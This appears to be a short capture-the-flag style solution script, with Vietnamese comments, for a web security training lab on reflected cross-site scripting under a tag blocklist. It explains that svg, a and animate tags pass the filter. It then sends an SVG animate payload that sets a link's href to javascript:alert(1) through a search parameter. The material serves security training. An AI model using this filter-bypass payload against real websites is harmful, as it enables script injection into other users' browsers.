# Ở bài lab này, hầu hết các tag đều bị block
# Tuy nhiên sau khi scan thì tôi tìm thây có <a> và <animate> không bị chặn
# Việc <animate> không bị chặn làm tôi đoán rằng <svg> cũng không bị chặn. Và điều đó đã đúng

# Chúng ta sẽ xây dựng payload tấn công dựa trên element <svg> sử dụng tab <animate>
# Điều đặc biệt ở đây là <animate> có 2 thuộc tính attributeName và values giúp ta khởi tạo giá trị cho tag con
# Việc web chỉ chăm chú vào việc check các attribute và events có trong <a> sẽ gây ra lỗi ngay lập tức

# payload:
# <svg><a><animate attributeName="href" values="javascript:alert(1)" /><text>Click here</text></a></svg>

import requests

burp0_url = "https://YOUR_HOST.web-security-academy.net:443/"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}
requests.get(burp0_url, headers=burp0_headers, params={"search": "<svg><a><animate attributeName=href values=javascript:alert(1) /><text>Click here</text></a></svg>"})